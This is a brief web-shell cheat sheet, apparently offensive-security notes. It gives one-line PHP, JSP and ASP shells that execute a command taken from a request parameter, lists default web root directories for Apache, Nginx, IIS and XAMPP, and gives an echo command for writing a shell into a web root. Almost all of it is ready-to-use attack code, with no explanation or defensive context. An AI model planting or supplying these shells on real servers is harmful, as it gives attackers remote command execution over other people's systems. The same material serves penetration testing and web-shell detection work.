# Web Shells

* php

```php
<?php system($_REQUEST["<PARAM>"]); ?>
```

* jsp

```php
<% Runtime.getRuntime().exec(request.getParameter("<PARAM>")); %>
```

* asp

```aspnet
<% eval request("<PARAM>") %>
```

### Web Roots

* Apache: `/var/www/html/`&#x20;
* Nginx: `/usr/local/nginx/html/`
* IIS: `C:\inetpub\wwwroot\`
* XAMPP: `C:\xampp\htdocs`

```bash
echo '<WEBSHELL>' > <WEBROOT>
```
